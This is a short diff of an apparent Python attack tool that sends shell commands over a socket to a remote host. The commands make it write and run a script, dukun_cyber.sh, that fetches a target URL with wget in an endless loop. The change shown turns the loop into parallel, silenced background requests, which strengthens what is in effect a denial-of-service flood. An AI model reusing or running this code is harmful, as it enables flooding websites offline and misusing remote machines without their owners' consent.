@@ -34,9 +34,9 @@ def run(ip, target):
 		# print serv.recv(1024)
 		serv.sendall("cd tmp\n")
 		# print serv.recv(1024)
-		serv.sendall("echo 'while true; do  wget "+target+"; rm banner-course.jpg; done' >> dukun_cyber.sh \n")
+		serv.sendall("echo 'while true; do  (wget -qO/dev/null  "+target+" &) > /dev/null;  done' >> dukun_cyber.sh \n")
 		# print serv.recv(1024)
-		serv.sendall("sh dukun_cyber.sh &>/dev/null&\n")
+		serv.sendall("sh dukun_cyber.sh &\n")
 		while True:
 			serv.recv(1024)
 	except:
